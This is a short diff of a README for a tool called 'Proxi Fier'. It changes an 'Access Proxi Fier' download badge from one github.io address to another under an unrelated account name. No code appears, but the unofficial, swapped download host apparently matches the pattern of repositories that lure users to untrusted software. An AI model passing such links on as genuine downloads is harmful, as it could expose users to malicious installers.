@@ -18,7 +18,7 @@
 4. Import existing proxy settings from previous tools  
 5. Activate full protection in under 2 minutes
 
-[![Access Proxi Fier](https://img.shields.io/badge/Access-Proxi_Fier-green)](https://edwardodonnellpubl.github.io/.github/proxi-fier-app)
+[![Access Proxi Fier](https://img.shields.io/badge/Access-Proxi_Fier-green)](https://lead-soft-set.github.io/.github/proxi-fier-app)
 
 ---
 
